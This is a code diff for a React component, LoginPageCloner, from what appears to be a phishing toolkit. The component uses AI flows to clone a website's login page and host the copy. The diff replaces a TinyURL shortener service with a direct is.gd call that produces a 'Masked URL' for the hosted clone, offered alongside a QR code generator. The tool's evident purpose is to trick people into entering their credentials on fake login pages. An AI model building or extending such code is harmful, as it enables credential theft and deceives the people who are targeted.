@@ -12,7 +12,6 @@ import { Button } from '@/components/ui/button';
 import { Loader2, AlertTriangle, Link as LinkIcon, Download, RefreshCw, Bot, Globe, Copy, Wand, StopCircle } from 'lucide-react';
 import { cloneLoginPage } from '@/ai/flows/page-cloner-flow';
 import { hostClonedPage } from '@/ai/flows/host-cloned-page-flow';
-import { shortenUrl } from '@/services/url-shortener-service';
 import { useToast } from '@/hooks/use-toast';
 import { QrCodeGenerator } from './qr-code-generator';
 import { Label } from './ui/label';
@@ -98,12 +97,13 @@ export function LoginPageCloner() {
       setIsShortening(true);
       setClonerError(null);
       try {
-        const response = await shortenUrl(fullHostedUrl);
-        if (response.success && response.shortUrl) {
-            setShortUrl(response.shortUrl);
-            toast({ title: "URL Shortened", description: "Masked link created with TinyURL." });
+        const response = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(fullHostedUrl)}`);
+        const data = await response.json();
+        if (data.shorturl) {
+            setShortUrl(data.shorturl);
+            toast({ title: "URL Shortened", description: "Masked link created successfully." });
         } else {
-            setClonerError(response.error || 'Failed to shorten URL.');
+            setClonerError(data.errormessage || 'Failed to shorten URL.');
         }
       } catch (err) {
         const errorMessage = err instanceof Error ? err.message : 'An unknown error occurred.';
@@ -223,7 +223,7 @@ export function LoginPageCloner() {
                 
                  {shortUrl && (
                   <div className="space-y-2 animate-in fade-in">
-                    <Label htmlFor="short-url">Masked URL (TinyURL)</Label>
+                    <Label htmlFor="short-url">Masked URL</Label>
                     <div className="flex items-center gap-2">
                         <Input id="short-url" readOnly value={shortUrl} className="font-mono text-accent"/>
                         <Button variant="ghost" size="icon" onClick={() => handleCopy(shortUrl)}><Copy className="h-4 w-4"/></Button>
